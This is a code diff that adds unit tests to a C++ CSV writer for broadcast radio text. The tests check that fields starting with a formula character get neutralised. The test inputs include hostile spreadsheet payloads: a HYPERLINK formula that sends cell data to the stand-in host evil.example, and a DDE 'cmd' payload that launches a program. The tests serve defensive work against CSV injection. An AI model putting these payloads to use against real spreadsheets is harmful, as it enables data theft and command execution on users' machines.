@@ -70,6 +70,20 @@ void testPureRules() {
     CHECK(rl::csvField(std::string("caf\xE9")) == "caf?");                                      // bytes the basic table leaves undefined
     CHECK(rl::csvField(std::string(200, 'x')).size() == rl::kMaxTextBytes);
     CHECK(rl::csvField("").empty());
+    // R6 (security review 2): air-sourced text never starts a spreadsheet formula
+    CHECK(rl::csvField("=1+1") == "'=1+1");
+    CHECK(rl::csvField("+44 20 7946 0000") == "'+44 20 7946 0000");
+    CHECK(rl::csvField("-NOW PLAYING") == "'-NOW PLAYING");
+    CHECK(rl::csvField("@SUM(A1)") == "'@SUM(A1)");
+    CHECK(rl::csvField("=HYPERLINK(\"http://evil.example/?x=\"&A1,\"click\")") == "\"'=HYPERLINK(\"\"http://evil.example/?x=\"\"&A1,\"\"click\"\")\"");   // the guard first, then the quoting
+    CHECK(rl::csvField("a=b").find('\'') == std::string::npos && rl::csvField("1+1") == "1+1");                 // only a LEADING character matters
+    {
+        // and through the line writer: the station name and the radio text of a hostile broadcast
+        const std::string line = rl::formatLine(1700000000000LL, 0, "=cmd|' /C calc'!A0", 10, "@SUM(1+1)*cmd");
+        CHECK(line.find(",'=cmd") != std::string::npos);
+        CHECK(line.find(",'@SUM") != std::string::npos);
+        CHECK(line.find(",=") == std::string::npos && line.find(",@") == std::string::npos);
+    }
     const std::string l = rl::formatLine(kT0, 2, "BBC R4  ", 4, "Now, the news");
     CHECK(l.back() == '\n');
     CHECK(has(l, ",2,BBC R4,4,Sport,\"Now, the news\"\n"));   // the padding of the 8-character name is dropped
